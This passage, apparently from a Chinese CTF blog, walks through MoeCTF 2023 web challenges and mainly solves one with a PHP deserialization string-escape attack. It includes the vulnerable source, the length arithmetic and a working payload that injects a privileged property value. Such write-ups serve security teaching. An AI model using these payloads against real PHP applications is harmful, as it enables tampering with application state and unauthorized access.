invoke__">serialize</span>(<span class="variable">$new_visitor</span>);</span><br><span class="line"><span class="variable">$after</span> = <span class="title class_">Deadly_Thirteen_Spears</span>::<span class="title function_ invoke__">Make_a_Move</span>(<span class="variable">$before</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Movements: &#x27;</span> . <span class="variable">$after</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$after</span>);</span><br><span class="line">&#125;<span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Even Caused A Glitch...&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">Your Movements: O:<span class="number">34</span>:<span class="string">&quot;Omg_It_Is_So_Cool_Bring_Me_My_Flag&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;Chant&quot;</span>;s:<span class="number">15</span>:<span class="string">&quot;夺命十三枪&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;Spear_Owner&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;Nobody&quot;</span>;&#125;</span><br><span class="line">Far away <span class="keyword">from</span> COOL...</span><br></pre></td></tr></table></figure></div>
+<p>这里先告诉了另一个源码地址<code>Hanxin.exe.php</code><br>先大致分析一下这个源码，检查有没有从get接受<code>chant</code>参数，然后创建一个类，把序列化之后的结果给<code>$before</code><br>序列化之后，又把这个<code>$before</code>传给<code>Deadly_Thirteen_Spears::Make_a_Move</code>函数<br>最后反序列化这个<code>$after</code></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>]) === <span class="title function_ invoke__">basename</span>(<span class="keyword">__FILE__</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Deadly_Thirteen_Spears</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$Top_Secret_Long_Spear_Techniques_Manual</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&quot;di_yi_qiang&quot;</span> =&gt; <span class="string">&quot;Lovesickness&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_er_qiang&quot;</span> =&gt; <span class="string">&quot;Heartbreak&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_san_qiang&quot;</span> =&gt; <span class="string">&quot;Blind_Dragon&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_si_qiang&quot;</span> =&gt; <span class="string">&quot;Romantic_charm&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_wu_qiang&quot;</span> =&gt; <span class="string">&quot;Peerless&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_liu_qiang&quot;</span> =&gt; <span class="string">&quot;White_Dragon&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_qi_qiang&quot;</span> =&gt; <span class="string">&quot;Penetrating_Gaze&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_ba_qiang&quot;</span> =&gt; <span class="string">&quot;Kunpeng&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_jiu_qiang&quot;</span> =&gt; <span class="string">&quot;Night_Parade_of_a_Hundred_Ghosts&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_shi_qiang&quot;</span> =&gt; <span class="string">&quot;Overlord&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_shi_yi_qiang&quot;</span> =&gt; <span class="string">&quot;Letting_Go&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_shi_er_qiang&quot;</span> =&gt; <span class="string">&quot;Decisive_Victory&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_shi_san_qiang&quot;</span> =&gt; <span class="string">&quot;Unrepentant_Lethality&quot;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">Make_a_Move</span>(<span class="params"><span class="variable">$move</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="built_in">self</span>::<span class="variable">$Top_Secret_Long_Spear_Techniques_Manual</span> <span class="keyword">as</span> <span class="variable">$index</span> =&gt; <span class="variable">$movement</span>)&#123;</span><br><span class="line">            <span class="variable">$move</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$index</span>, <span class="variable">$movement</span>, <span class="variable">$move</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$move</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Omg_It_Is_So_Cool_Bring_Me_My_Flag</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Chant</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Spear_Owner</span> = <span class="string">&#x27;Nobody&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$chant</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Chant = <span class="variable">$chant</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Spear_Owner = <span class="string">&#x27;Nobody&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;Spear_Owner !== <span class="string">&#x27;MaoLei&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Far away from COOL...&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Omg You&#x27;re So COOOOOL!!! &quot;</span> . <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;FLAG&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+<p>再看看这个<code>Hanxin.exe.php</code><br><code>Deadly_Thirteen_Spears</code>有一个私有数组，这这里存储的是每枪的名字Make_a_Move函数接受一个<code>$move</code>函数，会把里面的第x枪转换成对应的真实名字<br>Omg_It_Is_So_Cool_Bring_Me_My_Flag类接受<code>chant</code>参数，会把<code>$this-&gt;Chant</code>参数赋值成传入的值，最后如果<code>$this -&gt; Spear_Owner</code>是<code>Maolei</code>就是能得到flag</p>
+<p>总的来看，Spear_Owner是程序里面确定的，我们能控制的是Chant，所以猜测是用的反序列化字符逃逸，因为还有一个move函数会替换</p>
+<p>这里我们先写一个<code>Omg_It_Is_So_Cool_Bring_Me_My_Flag</code>类的随便一个反序列化的结果</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Omg_It_Is_So_Cool_Bring_Me_My_Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Chant</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Spear_Owner</span> = <span class="string">&#x27;Nobody&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$chant</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Chant = <span class="variable">$chant</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Spear_Owner = <span class="string">&#x27;Nobody&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;Spear_Owner !== <span class="string">&#x27;MaoLei&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Far away from COOL...&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Omg You&#x27;re So COOOOOL!!! &quot;</span> . <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;FLAG&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Omg_It_Is_So_Cool_Bring_Me_My_Flag</span>(<span class="string">&quot;di_yi_qiang&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>结果是</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">34</span>:<span class="string">&quot;Omg_It_Is_So_Cool_Bring_Me_My_Flag&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;Chant&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;di_yi_qiang&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;Spear_Owner&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;Nobody&quot;</span>;&#125;</span><br></pre></td></tr></table></figure></div>
+<p>我们能控制的就是这里的”di_yi_qiang” 注意到”di_yi_qiang”会被替换成”Lovesickness” 也就是从11个字符替换成了12个字符。<br>这里我简单说一下什么是反序列化的字符逃逸，反序列化中的结构是类似于<code>s:5:&quot;Chant&quot;</code>5代表这个参数的长度，后面跟着参数具体的值，当替换了之后了，比如11个字符替换成了12个字符，而且是在序列化之后进行的替换，这样子参数长度(5)没变，但是参数自己本身的长度因为替换发生了改变，而反序列化看到<code>;&#125;</code>就当作结束了。所以就可以被利用了。我们通过<code>$chant</code>这个参数传入我们想要的序列化的值，然后程序在反序列化时候会提前终止，又因为进行过了替换操作，所以字符长度也会符合条件</p>
+<p>现在我们想要的反序列化的值</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">34</span>:<span class="string">&quot;Omg_It_Is_So_Cool_Bring_Me_My_Flag&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;Chant&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;di_yi_qiang&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;Spear_Owner&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;MaoLei&quot;</span>;&#125;</span><br></pre></td></tr></table></figure></div>
+<p>那现在能控制的是这里的”di_yi_qiang”,每次替换之后会比之前的字符加1（12-11）<br>我们要构造的</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;;s:11:&quot;</span>Spear_Owne<span class="string">r&quot;;s:6:&quot;</span>MaoLei<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure></div>
+<p>一共是35位，所以我们要构造35个”di_yi_qiang”<br>所以参数长度是35 + 35 * 11 &#x3D; 420<br>替换之后就是</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">34</span>:<span class="string">&quot;Omg_It_Is_So_Cool_Bring_Me_My_Flag&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;Chant&quot;</span>;s:<span class="number">420</span>:<span class="number">35</span>个<span class="string">&quot;di_yi_qiang&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;Spear_Owner&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;MaoLei&quot;</span>;&#125;</span><br></pre></td></tr></table></figure></div>
+<p>payload</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$post</span> = <span class="string">&#x27;&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;MaoLei&quot;;&#125;&quot;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt;= <span class="number">35</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$post</span> = <span class="string">&quot;di_yi_qiang&quot;</span>.<span class="variable">$post</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$post</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">di_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiang<span class="string">&quot;;s:11:&quot;</span>Spear_Owner<span class="string">&quot;;s:6:&quot;</span>MaoLei<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>传入url，得到flag<br><img src="https://pic1.imgdb.cn/item/67bf03afd0e0a243d40619ae.png"></p>
+<h1 id="彼岸的flag"><a href="#彼岸的flag" class="headerlink" title="彼岸的flag"></a>彼岸的flag</h1><p>题目描述：我们在某个平行宇宙中得到了一段 moectf 群的聊天记录，粗心的出题人在这个聊天平台不小心泄露了自己的 flag<br>根据题目描述，flag就在这个聊天记录里面，查看页面源代码，然后搜索moectf就找到flag<br><img src="https://pic1.imgdb.cn/item/67bf336ed0e0a243d40649bf.png"></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>guayu-kakeru
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://guayu-kakeru.github.io/posts/28713.html" title="MoeCTF_2023web">https://guayu-kakeru.github.io/posts/28713.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+              <a href="/tags/web/" rel="tag"># web</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/59777.html" rel="prev" title="CTF-web笔记">
+      <i class="fa fa-chevron-left"></i> CTF-web笔记
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#cookie"><span class="nav-text">cookie</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97"><span class="nav-text">web入门指北</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#gas-gas-gas"><span class="nav-text">gas!gas!gas!</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#http"><span class="nav-text">http</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#meo-%E5%9B%BE%E5%BA%8A"><span class="nav-text">meo 图床</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#moe%E5%9B%BE%E5%BA%8A"><span class="nav-text">moe图床</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#signin"><span class="nav-text">signin</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%86%E8%A7%A3%E4%BD%A0%E7%9A%84%E5%BA%A7%E9%A9%BE"><span class="nav-text">了解你的座驾</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%87%BA%E5%8E%BB%E6%97%85%E6%B8%B8%E7%9A%84%E5%BF%83%E6%B5%B7"><span class="nav-text">出去旅游的心海</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A4%A7%E6%B5%B7%E6%8D%9E%E9%92%88"><span class="nav-text">大海捞针</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A4%BA%E5%91%BD%E5%8D%81%E4%B8%89%E6%9E%AA"><span class="nav-text">夺命十三枪</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BD%BC%E5%B2%B8%E7%9A%84flag"><span class="nav-text">彼岸的flag</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="guayu-kakeru"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">guayu-kakeru</p>
+  <div class="site-description" itemprop="description">一年过后，你会希望从今天就开始行动。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">52</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/guayukakeru" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;guayukakeru" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/1806449041@qq.com" title="E-Mail → 1806449041@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+  <div class="links-of-recent-posts motion-element">
+    <div class="links-of-recent-posts-title">
+      <i class="fa fa-history fa-fw"></i>
+      最近文章
+    </div>
+    <ul class="links-of-recent-posts-list">
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/28713.html" title="posts&#x2F;28713.html">MoeCTF_2023web</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/59777.html" title="posts&#x2F;59777.html">CTF-web笔记</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/35880.html" title="posts&#x2F;35880.html">MoeCTF_2022web</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/51240.html" title="posts&#x2F;51240.html">MoeCTF_2021web</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/32688.html" title="posts&#x2F;32688.html">HMV-light</a>
+        </li>
+    </ul>
+  </div>
+      </div>
+
+      
+      
+        <div class="links-of-blogroll motion-element links-of-blogroll-undefined">
+          <div class="links-of-blogroll-title">
+            <i class="fa fa-history fa-" aria-hidden="true"></i>
+            
+          </div>
+          <ul class="links-of-blogroll-list">
+            
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+          </ul>
+        </div>
+      
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">guayu-kakeru</span>
+</div>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
